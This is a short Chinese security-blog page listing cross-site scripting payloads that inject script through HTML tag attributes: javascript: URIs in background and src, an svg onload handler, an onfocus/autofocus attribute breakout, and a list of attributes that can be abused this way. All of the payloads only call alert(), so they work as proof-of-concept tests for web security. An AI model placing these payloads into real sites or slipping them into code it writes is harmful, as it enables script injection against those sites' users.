---
layout: default
---
# ![](../img/hj.jpg)XSS标签属性值注射

javascript:[code]形式
如:
```
<table background=''javascript:alert(/xss/)''></table>
<img src=''javascript:alert('xss');''>
<svg onload=alert(1)>
'' onfocus=javascript:alert(1) autofocus>
```
常用属性有：
```
href,
lowsrc,
bgsound,
background,
value,
action,
dynsrc
```
__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
